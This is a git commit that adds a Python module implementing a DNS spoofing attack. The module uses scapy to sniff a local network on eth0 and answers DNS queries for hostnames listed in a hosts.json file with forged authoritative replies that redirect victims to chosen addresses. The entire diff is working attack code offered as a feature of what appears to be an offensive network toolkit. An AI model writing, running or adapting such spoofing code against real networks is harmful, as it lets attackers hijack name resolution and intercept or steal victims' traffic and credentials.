d057cdb4dbd2c3ad9b5ddd5a4451656ba2027fde
ReddyyZ <arthurc.oli.whitehat@gmail.com>
2020-09-22 16:21:14 -0300

    Added DNS Spoofing Attack

---
+++ include/dnsspoof.py
@@ -0,0 +1,78 @@
+from scapy.all import *
+from multiprocessing import Process
+from colorama import init, Fore
+import socket, netifaces, json, logging
+
+white   = Fore.WHITE
+black   = Fore.BLACK
+red     = Fore.RED
+reset   = Fore.RESET
+blue    = Fore.BLUE
+cyan    = Fore.CYAN
+yellow  = Fore.YELLOW
+green   = Fore.GREEN
+magenta = Fore.MAGENTA
+
+class DNSSpoof(object):
+    def __init__(self,verbose=False):
+        self.main_thread = None
+        self.interface   = "eth0"
+        self.iface_info  = netifaces.ifaddresses(self.interface)
+        self.local_ip    = self.iface_info[netifaces.AF_INET][0]['addr']
+        self.local_mac   = self.iface_info[netifaces.AF_LINK][0]['addr']
+
+        init()
+        logging.addLevelName(logging.CRITICAL, f"[{red}!!{reset}]")
+        logging.addLevelName(logging.WARNING, f"[{red}!{reset}]")
+        logging.addLevelName(logging.INFO, f"[{cyan}*{reset}]")
+        logging.addLevelName(logging.DEBUG, f"[{magenta}*{reset}]")
+        logging.basicConfig(format=f"%(levelname)s %(message)s", level=logging.DEBUG if verbose else logging.INFO)
+        logging.debug(f"DNS: Local IP - {self.local_ip}, Local MAC - {self.local_mac}")
+
+    def config(self):
+        conf  = json.loads(open("config/hosts.json","r").read())
+        return conf
+
+    def handle_pkt(self,pkt):
+        if pkt.haslayer(IP) and pkt.haslayer(DNS):
+            if pkt[IP].src != self.local_ip and pkt[Ether].dst == self.local_mac:
+                conf = self.config()
+                if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[DNSQR].qname.decode() in list(conf.keys()):
+                    name     = pkt[DNSQR].qname.decode()
+                    fake_pkt = IP(dst=pkt[IP].src,
+                                src=pkt[IP].dst)/\
+                                UDP(dport=pkt[UDP].sport,sport=53)/\
+                                DNS(id=pkt[DNS].id,
+                                    qd=pkt[DNS].qd,
+                                    aa=1,
+                                    qr=1,
+                                    ancount=1,
+                                    an=DNSRR(rrname=pkt[DNSQR].qname, rdata=conf[name]))/\
+                                DNSRR(
+                                    rrname=pkt[DNSQR].qname,
+                                    rdata=conf[name])
+                    send(fake_pkt)
+                    logging.debug(f"DNS: Spoofed request from {pkt[IP].src} for {name} to {conf[name]}")
+
+    def sniff_thread(self):
+        sniff(prn=self.handle_pkt)
+
+    def start(self):
+        self.main_thread = Process(target=self.sniff_thread)
+        self.main_thread.start()
+        logging.debug("DNS: Sniff thread started")
+
+    def stop(self):
+        self.main_thread.kill()
+        logging.debug("DNS: Sniff thread stopped")
+
+
+if __name__ == "__main__":
+    dns = DNSSpoof(verbose=True)
+    dns.start()
+
+    try:
+        while True:
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        dns.stop()
